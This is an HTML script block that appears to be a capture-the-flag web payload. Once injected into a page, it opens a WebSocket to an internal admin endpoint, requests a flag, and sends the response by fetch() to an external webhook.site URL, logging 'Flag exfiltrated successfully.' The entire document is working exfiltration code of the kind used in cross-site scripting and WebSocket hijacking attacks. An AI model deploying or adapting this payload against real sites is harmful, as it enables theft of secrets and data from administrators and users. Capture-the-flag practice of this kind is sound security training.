<script>
    (function () {
        console.info("Starting the connection...");

        const socket = new WebSocket('ws://web:8080/admin/ws');

        socket.addEventListener('open', function () {
            console.log("WebSocket is open, requesting flag...");
            socket.send('flag');
        });

        socket.addEventListener('message', function (msg) {
            const flag = msg.data;
            const url = 'https://webhook.site/e72c61d4-ac26-4a4f-bad4-d61e4d7d8129/log';
            const params = new URLSearchParams();
            params.append('flag', encodeURIComponent(flag));

            fetch(url + '?' + params.toString())
                .then(response => {
                    if (response.ok) {
                        console.log("Flag exfiltrated successfully.");
                    } else {
                        console.error("Failed to send flag.");
                    }
                })
                .catch(err => console.error('Error during fetch: ', err));
        });
    })();
</script>